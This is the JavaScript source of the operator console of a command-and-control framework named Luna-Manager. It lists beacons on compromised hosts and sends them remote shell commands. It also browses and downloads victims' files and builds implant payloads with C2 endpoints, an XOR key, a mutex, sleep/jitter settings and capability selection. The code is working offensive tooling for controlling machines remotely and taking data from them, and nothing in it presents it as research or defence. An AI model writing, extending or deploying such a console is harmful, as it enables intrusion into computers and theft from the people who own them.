/* Luna-Manager operator console. Vanilla JS, no build step, no external assets. */

const Luna = (() => {
  let token = localStorage.getItem('luna.token') || '';
  let operator = localStorage.getItem('luna.operator') || '';
  let sessions = [];
  let current = null;
  let activeTab = 'terminal';
  let fsPath = 'C:\\';
  let pollTimer = null;
  let caps = {};

  const $ = (id) => document.getElementById(id);
  const esc = (s) => String(s ?? '').replace(/[&<>"']/g, (c) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
  }[c]));

  async function api(path, opts = {}) {
    const headers = { 'Content-Type': 'application/json', ...(opts.headers || {}) };
    if (token) headers.Authorization = 'Bearer ' + token;
    const res = await fetch(path, { ...opts, headers });
    if (res.status === 401) { logout(); throw new Error('unauthorized'); }
    const ctype = res.headers.get('content-type') || '';
    const body = ctype.includes('json') ? await res.json() : await res.text();
    if (!res.ok) throw new Error((body && body.error) || res.statusText);
    return body;
  }

  async function login(ev) {
    ev.preventDefault();
    const err = $('login-error');
    err.textContent = '';
    try {
      const res = await api('/api/login', {
        method: 'POST',
        body: JSON.stringify({
          username: $('username').value.trim(),
          password: $('password').value,
        }),
      });
      token = res.token;
      operator = res.operator;
      localStorage.setItem('luna.token', token);
      localStorage.setItem('luna.operator', operator);
      boot();
    } catch (e) {
      err.textContent = e.message;
    }
    return false;
  }

  function logout() {
    token = '';
    operator = '';
    localStorage.removeItem('luna.token');
    localStorage.removeItem('luna.operator');
    $('app').classList.add('hidden');
    $('login').classList.remove('hidden');
    if (pollTimer) clearInterval(pollTimer);
  }

  function boot() {
    $('login').classList.add('hidden');
    $('app').classList.remove('hidden');
    $('who').textContent = operator;
    loadCaps();
    refresh();
    if (pollTimer) clearInterval(pollTimer);
    pollTimer = setInterval(refresh, 3000);
  }

  async function loadCaps() {
    try {
      caps = (await api('/api/capabilities')).kinds || {};
      const box = $('b-caps');
      box.innerHTML = Object.keys(caps).map((k) =>
        `<label><input type="checkbox" value="${esc(k)}" checked> ${esc(k)}</label>`).join('');
    } catch (e) { /* leave empty */ }
  }

  async function refresh() {
    try {
      const [overview, list] = await Promise.all([
        api('/api/overview'),
        api('/api/sessions'),
      ]);
      $('stat-alive').textContent = overview.alive;
      $('stat-total').textContent = overview.total;
      $('stat-queue').textContent = overview.pending_tasks;
      sessions = list.sessions || [];
      renderSessions();
      if (current) {
        const fresh = sessions.find((s) => s.id === current.id);
        if (fresh) { current = fresh; paintHost(); }
      }
    } catch (e) { /* keep last view */ }
  }

  function renderSessions() {
    const q = ($('search').value || '').toLowerCase();
    const box = $('sessions');
    const shown = sessions.filter((s) =>
      !q || `${s.hostname} ${s.username} ${s.internal_ip}`.toLowerCase().includes(q));
    if (!shown.length) {
      box.innerHTML = `<div class="beacon"><span class="user">no beacons${
        sessions.length ? ' matching filter' : ' yet'}</span></div>`;
      return;
    }
    box.innerHTML = shown.map((s) => `
      <div class="beacon ${current && current.id === s.id ? 'active' : ''}"
           onclick="Luna.select('${esc(s.id)}')">
        <div class="row1">
          <span class="dot ${s.alive ? 'live' : ''}"></span>
          <span class="name">${esc(s.hostname || 'unknown')}</span>
        </div>
        <div class="user">${esc(s.username || '?')} · ${esc(s.internal_ip || '')} · ${esc(s.transport)}</div>
      </div>`).join('');
  }

  function select(sid) {
    current = sessions.find((s) => s.id === sid) || null;
    if (!current) return;
    $('empty').classList.add('hidden');
    $('workspace').classList.remove('hidden');
    $('buildview').classList.add('hidden');
    paintHost();
    renderSessions();
    tab('terminal');
    if (!current._greeted) {
      current._greeted = true;
      sysline(`session ${current.id} · ${current.os_name || ''} ${current.arch || ''}`);
    }
  }

  function paintHost() {
    $('host-name').textContent = `${current.username}@${current.hostname}`;
    $('host-meta').textContent = [
      current.os_name, current.arch, current.internal_ip,
      current.elevated ? 'elevated' : 'user', current.transport,
      current.id,
    ].filter(Boolean).join('  ·  ');
    $('info-body').textContent = JSON.stringify(current, null, 2);
  }

  function tab(name) {
    activeTab = name;
    if (name === 'build') {
      $('empty').classList.add('hidden');
      $('workspace').classList.add('hidden');
      $('buildview').classList.remove('hidden');
      loadBuilds();
      return;
    }
    $('buildview').classList.add('hidden');
    if (!current) { $('workspace').classList.add('hidden'); $('empty').classList.remove('hidden'); return; }
    $('workspace').classList.remove('hidden');
    ['terminal', 'files', 'tasks', 'info'].forEach((t) => {
      $('pane-' + t).classList.toggle('hidden', t !== name);
    });
    document.querySelectorAll('.tabs button').forEach((b) => {
      b.classList.toggle('active', b.dataset.tab === name);
    });
    if (name === 'tasks') loadTasks();
    if (name === 'files') fsGo(fsPath);
    if (name === 'terminal') $('cmd').focus();
  }

  // -- terminal -------------------------------------------------------
  function sysline(text) {
    const el = document.createElement('div');
    el.className = 'sys';
    el.textContent = text;
    $('term').appendChild(el);
    $('term').scrollTop = $('term').scrollHeight;
  }

  function line(text, cls = 'out') {
    const el = document.createElement('div');
    el.className = cls;
    el.textContent = text;
    $('term').appendChild(el);
    $('term').scrollTop = $('term').scrollHeight;
  }

  async function dispatch(kind, args) {
    const res = await api(`/api/sessions/${current.id}/task`, {
      method: 'POST',
      body: JSON.stringify({ kind, args }),
    });
    return res.task_id;
  }

  async function awaitTask(tid, timeoutMs = 120000) {
    const started = Date.now();
    for (;;) {
      const row = await api(`/api/tasks/${tid}?result=1`);
      if (row.state === 'done' || row.state === 'error' || row.state === 'expired') return row;
      if (Date.now() - started > timeoutMs) throw new Error('timed out waiting for beacon');
      await new Promise((r) => setTimeout(r, 700));
    }
  }

  async function run(ev) {
    ev.preventDefault();
    const input = $('cmd');
    const cmd = input.value.trim();
    if (!cmd || !current) { input.value = ''; return false; }
    input.value = '';
    line('$ ' + cmd, 'in');
    try {
      const tid = await dispatch('shell', { cmd });
      const row = await awaitTask(tid);
      if (row.state === 'expired') line('[no check-in before timeout]', 'bad');
      else if (row.ok) line(row.result || '(no output)');
      else line(row.err || row.result || 'command failed', 'bad');
    } catch (e) {
      line(e.message, 'bad');
    }
    input.focus();
    return false;
  }

  // -- files ----------------------------------------------------------
  let fsEntries = [];
  let fsBase = '';

  async function fsGo(path) {
    if (!current) return;
    fsPath = path;
    $('path').value = path;
    const body = $('filebody');
    body.innerHTML = '<tr><td colspan="4" class="user">listing…</td></tr>';
    try {
      const tid = await dispatch('ls', { path });
      const row = await awaitTask(tid, 45000);
      if (!row.ok) {
        body.innerHTML = `<tr><td colspan="4">${esc(row.err || 'failed')}</td></tr>`;
        return;
      }
      let listing;
      try { listing = JSON.parse(row.result); } catch { listing = {}; }
      fsBase = listing.path || path;
      fsPath = fsBase;
      $('path').value = fsBase;
      fsEntries = (listing.entries || []).slice().sort((a, b) =>
        (b.dir ? 1 : 0) - (a.dir ? 1 : 0) || String(a.name).localeCompare(String(b.name)));
      if (!fsEntries.length) {
        body.innerHTML = '<tr><td colspan="4" class="user">empty</td></tr>';
        return;
      }
      body.innerHTML = fsEntries.map((e, i) => `
        <tr>
          <td class="${e.dir ? 'dir' : ''}" data-idx="${i}">${e.dir ? '&#9656; ' : ''}${esc(e.name)}</td>
          <td>${e.dir ? '' : fmtSize(e.size)}</td>
          <td>${e.mtime ? new Date(e.mtime * 1000).toLocaleString() : ''}</td>
          <td>${e.dir ? '' : `<button class="link" data-pull="${i}" title="download">&#8595;</button>`}</td>
        </tr>`).join('');
      body.querySelectorAll('td[data-idx]').forEach((td) => {
        td.addEventListener('click', () => opener(fsEntries[Number(td.dataset.idx)]));
      });
      body.querySelectorAll('button[data-pull]').forEach((btn) => {
        btn.addEventListener('click', (ev) => {
          ev.stopPropagation();
          pull(joinPath(fsBase, fsEntries[Number(btn.dataset.pull)].name));
        });
      });
    } catch (e) {
      body.innerHTML = `<tr><td colspan="4">${esc(e.message)}</td></tr>`;
    }
  }

  function joinPath(base, name) {
    if (!base) return name;
    const sep = base.includes('\\') ? '\\' : '/';
    return base.endsWith(sep) ? base + name : base + sep + name;
  }

  function opener(entry) {
    const full = joinPath(fsBase, entry.name);
    if (entry.dir) return fsGo(full);
    return viewFile(full);
  }

  function fsClick() { /* retained for template compatibility */ }

  function fsUp() {
    const trimmed = fsPath.replace(/[\\/]+$/, '');
    const sep = trimmed.includes('\\') ? '\\' : '/';
    const parts = trimmed.split(/[\\/]/);
    if (parts.length <= 1) return fsGo(fsPath);
    parts.pop();
    let up = parts.join(sep);
    if (/^[A-Za-z]:$/.test(up)) up += '\\';
    if (!up) up = sep === '\\' ? 'C:\\' : '/';
    fsGo(up);
  }

  async function viewFile(path) {
    try {
      const tid = await dispatch('cat', { path });
      const row = await awaitTask(tid, 60000);
      tab('terminal');
      line(`$ cat ${path}`, 'in');
      line(row.ok ? (row.result || '(empty)') : (row.err || 'failed'), row.ok ? 'out' : 'bad');
    } catch (e) { tab('terminal'); line(e.message, 'bad'); }
  }

  async function pull(path) {
    try {
      const tid = await dispatch('download', { path });
      const row = await awaitTask(tid, 300000);
      if (!row.ok) throw new Error(row.err || 'download failed');
      const bin = atob(row.result || '');
      const bytes = new Uint8Array(bin.length);
      for (let i = 0; i < bin.length; i += 1) bytes[i] = bin.charCodeAt(i);
      const url = URL.createObjectURL(new Blob([bytes]));
      const a = document.createElement('a');
      a.href = url;
      a.download = path.split(/[\\/]/).pop() || 'download.bin';
      a.click();
      URL.revokeObjectURL(url);
      tab('terminal');
      line(`downloaded ${path} (${fmtSize(bytes.length)})`, 'sys');
    } catch (e) { tab('terminal'); line(e.message, 'bad'); }
  }

  function fmtSize(n) {
    const v = Number(n || 0);
    if (v < 1024) return v + ' B';
    if (v < 1048576) return (v / 1024).toFixed(1) + ' KB';
    if (v < 1073741824) return (v / 1048576).toFixed(1) + ' MB';
    return (v / 1073741824).toFixed(2) + ' GB';
  }

  // -- tasks ----------------------------------------------------------
  async function loadTasks() {
    if (!current) return;
    const body = $('taskbody');
    try {
      const res = await api(`/api/sessions/${current.id}/tasks?limit=80`);
      body.innerHTML = (res.tasks || []).map((t) => `
        <tr>
          <td>${esc(t.kind)}</td>
          <td><span class="chip ${esc(t.state)}">${esc(t.state)}</span></td>
          <td>${new Date(t.created_at * 1000).toLocaleTimeString()}</td>
          <td>${t.err ? esc(t.err.slice(0, 80)) : (t.result_size ? fmtSize(t.result_size) : '—')}</td>
        </tr>`).join('') || '<tr><td colspan="4" class="user">no tasks</td></tr>';
    } catch (e) { body.innerHTML = `<tr><td colspan="4">${esc(e.message)}</td></tr>`; }
  }

  // -- builder --------------------------------------------------------
  async function build(ev) {
    ev.preventDefault();
    const selected = Array.from(document.querySelectorAll('#b-caps input:checked')).map((i) => i.value);
    const payload = {
      name: $('b-name').value.trim(),
      transport: $('b-transport').value,
      endpoints: $('b-endpoints').value,
      xor_key: $('b-xor').value.trim(),
      mutex: $('b-mutex').value.trim(),
      sleep: Number($('b-sleep').value),
      jitter: Number($('b-jitter').value),
      output: $('b-output').value.trim(),
      capabilities: selected.length ? selected : 'all',
    };
    try {
      const res = await api('/api/build', { method: 'POST', body: JSON.stringify(payload) });
      await loadBuilds();
      setTimeout(loadBuilds, 2500);
      console.log('build submitted', res.id);
    } catch (e) {
      alert(e.message);
    }
    return false;
  }

  async function loadBuilds() {
    const box = $('builds');
    try {
      const res = await api('/api/builds');
      const builds = res.builds || [];
      box.innerHTML = builds.map((b) => {
        const dl = (b.status === 'ok' || b.status === 'source_only')
          ? `<button data-artifact="${esc(b.id)}">Download</button>` : '';
        return `<div class="build">
          <div class="top">
            <span>${esc(b.id)}</span>
            <span><span class="chip ${b.status === 'ok' ? 'done' : (b.status === 'error' ? 'error' : 'dispatched')}">${esc(b.status)}</span></span>
          </div>
          <div class="msg">${esc(b.config.transport)} · ${esc((b.config.endpoints || []).join(' '))} · ${esc(b.config.name)}</div>
          ${b.message ? `<div class="msg">${esc(b.message.slice(0, 400))}</div>` : ''}
          <div style="margin-top:8px">${dl}</div>
        </div>`;
      }).join('') || '<div class="user" style="color:var(--dim)">no builds yet</div>';
      box.querySelectorAll('button[data-artifact]').forEach((btn) => {
        btn.addEventListener('click', () => download(btn.dataset.artifact));
      });
    } catch (e) {
      box.innerHTML = `<div style="color:var(--err)">${esc(e.message)}</div>`;
    }
  }

  async function download(buildId) {
    try {
      const res = await fetch(`/api/builds/${encodeURIComponent(buildId)}/artifact`, {
        headers: { Authorization: 'Bearer ' + token },
      });
      if (!res.ok) throw new Error('artifact unavailable: ' + res.status);
      const blob = await res.blob();
      const disp = res.headers.get('content-disposition') || '';
      const match = disp.match(/filename="([^"]+)"/);
      const name = match ? match[1] : buildId + '.bin';
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = name;
      a.click();
      URL.revokeObjectURL(url);
    } catch (e) {
      alert(e.message);
    }
  }

  // -- boot -----------------------------------------------------------
  window.addEventListener('DOMContentLoaded', () => {
    document.querySelectorAll('.tabs button').forEach((b) => {
      if (b.dataset.tab === 'build') return;
    });
    if (token) {
      boot();
    } else {
      $('login').classList.remove('hidden');
    }
  });

  return { login, logout, refresh, select, tab, run, fsGo, fsUp, fsClick, pull, loadTasks, build, loadBuilds, renderSessions, download };
})();
